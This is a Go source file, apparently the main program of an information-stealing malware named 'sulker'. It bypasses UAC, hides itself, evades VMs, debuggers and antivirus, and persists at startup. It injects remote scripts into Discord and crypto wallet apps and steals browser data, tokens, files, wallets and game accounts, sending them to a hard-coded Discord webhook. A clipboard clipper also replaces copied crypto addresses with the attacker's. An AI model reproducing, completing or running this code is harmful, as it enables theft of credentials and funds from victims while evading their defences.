package main

import (
	"github.com/realiztteam/sulker/modules/antidebug"
	"github.com/realiztteam/sulker/modules/antivm"
	"github.com/realiztteam/sulker/modules/antivirus"
	"github.com/realiztteam/sulker/modules/browsers"
	"github.com/realiztteam/sulker/modules/clipper"
	"github.com/realiztteam/sulker/modules/commonfiles"
	"github.com/realiztteam/sulker/modules/discodes"
	"github.com/realiztteam/sulker/modules/discordinjection"
	"github.com/realiztteam/sulker/modules/fakeerror"
	"github.com/realiztteam/sulker/modules/games"
	"github.com/realiztteam/sulker/modules/hideconsole"
	"github.com/realiztteam/sulker/modules/startup"
	"github.com/realiztteam/sulker/modules/system"
	"github.com/realiztteam/sulker/modules/tokens"
	"github.com/realiztteam/sulker/modules/uacbypass"
	"github.com/realiztteam/sulker/modules/wallets"
	"github.com/realiztteam/sulker/modules/walletsinjection"
	"github.com/realiztteam/sulker/utils/program"
)

func main() {
	CONFIG := map[string]interface{}{
		"webhook": "https://discord.com/api/webhooks/1297305087370068008/3Nppqqwo5c287jLB1PzWwuvlYnxvKgjd7zbeCkxsw1C7DTQgPBPkYBvQdfhKSTeb6x3b",
		"cryptos": map[string]string{
			"BTC": "bc1qkseyuxqwt4z3tma92sa773yxshz70gyptltcs9",
			"BCH": "qrkzsvzrxu5ws6ummnq5kpmfzz35pwcgyg8xlzrhyw",
			"ETH": "0x93b0c0029d81B40011d7478df19c5238bA971248",
			"XMR": "43LXvTBM3V3eYav6LDf4wP99TpKFN6atYGTND4ohPgzwg2CCa4ygNfKF74YiEY6cryRhSAfCKRWQ3EXEYx2T49BC21pwe6w",
			"LTC": "LiM1y1Kwh794qoARBV5owUmkFMM63av7KL",
			"XCH": "",
			"XLM": "GCZVZ3YKVNGCWKUWP5SGZOOTANZKXSR6TXVDCQVK6JEWG3JTF57D7RUC",
			"TRX": "TR5ewtUjj4wAYZDRrhFfipdky5Sxbi8igz",
			"ADA": "addr1qy6zydf0dzqg76t7qkj5emhtlwqpnaxcn6t5pq0vcwwe7rf5yg6j76yq3a5hupd9fnhwh7uqr86d385hgzq7esuanuxszr8g2r",
			"DASH": "XtoFkEg5k3fZ46e2DB9LNFTAqtZXP9ak17",
			"DOGE": "D7cjs7HfPUaBsN8dKbEaMfy69TGDF7GqY9",
		},
	}

	if program.IsAlreadyRunning() {
		return
	}

	uacbypass.Run()

	hideconsole.Run()
	program.HideSelf()

	if !program.IsInStartupPath() {
		go fakeerror.Run()
		go startup.Run()
	}

	antivm.Run()
	go antidebug.Run()
	go antivirus.Run()

	go discordinjection.Run(
		"https://raw.githubusercontent.com/RealiztTeam/discord-injection/refs/heads/main/injection.js",
		CONFIG["webhook"].(string),
	)
	go walletsinjection.Run(
		"https://github.com/hackirby/wallets-injection/raw/main/atomic.asar",
		"https://github.com/hackirby/wallets-injection/raw/main/exodus.asar",
		CONFIG["webhook"].(string),
	)

	actions := []func(string){
		system.Run,
		browsers.Run,
		tokens.Run,
		discodes.Run,
		commonfiles.Run,
		wallets.Run,
		games.Run,
	}

	for _, action := range actions {
		go action(CONFIG["webhook"].(string))
	}

	clipper.Run(CONFIG["cryptos"].(map[string]string))
}
